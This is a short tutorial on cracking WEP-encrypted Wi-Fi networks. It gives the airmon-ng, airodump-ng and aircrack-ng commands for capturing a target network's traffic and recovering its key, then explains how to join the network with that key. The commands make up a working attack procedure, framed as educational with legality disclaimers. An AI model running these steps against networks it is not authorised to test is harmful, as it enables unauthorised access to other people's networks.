# Exploiting WEP

Below is a set of instructions to guide you through the process of monitoring and cracking [[Wired Equivalent Privacy (WEP)|WEP]] encrypted networks using tools like `airmon-ng`, `airodump-ng`, and `aircrack-ng`. This guide assumes you're running a Linux-based system with these tools installed and Terminator as your terminal emulator. Always ensure you have the necessary permissions and you're complying with legal regulations when using these tools.

### Part 1: Setting up Monitor Mode and Capturing Packets
1. Open Terminator (you need Terminator because you can run 2 instances of terminal).
2. Start the network interface in monitor mode. Replace `wlan1` with your wireless interface name if different:
   ```bash
   sudo airmon-ng start wlan1
   ```
3. Begin capturing packets on `wlan1`. This will list all available WiFi networks:
   ```bash
   sudo airodump-ng wlan1
   ```
4. Focus on a specific BSSID (replace `F8:23:B2:B9:50:A8` with the target BSSID) and channel (here channel 1):
   ```bash
   sudo airodump-ng --bssid F8:23:B2:B9:50:A8 --channel 1 --write basic_wep wlan1
   ```
   - Monitor the `#Data` column in the output. This column shows the number of unique data packets you've captured, which are crucial for cracking the key. The more packets you capture, the better your chances of successfully cracking the WEP key.

### Part 2: Cracking the WEP Key
5. Open a second window in Terminator.
6. List files to check the presence of the capture file (`basic_wep-01.cap`):
   ```bash
   ls
   ```
7. Use `aircrack-ng` to crack the WEP key using the capture file:
   ```bash
   sudo aircrack-ng basic_wep-01.cap
   ```
   - Once the process completes, `aircrack-ng` will display the WEP key. It might look something like `41:73:32:33:70`.

### Part 3: Using the Cracked WEP Key
8. Copy the WEP key, removing all colons (`:`) to make it a continuous string of numbers, e.g., `4173323370`.
9. Go to your WiFi connection network settings.
10. When prompted for a password, paste the modified key (`4173323370`) into the password field.

This procedure outlines a basic attack on WEP security, highlighting the vulnerabilities in WEP encryption. Always ensure that your actions are ethical and legal within your jurisdiction.
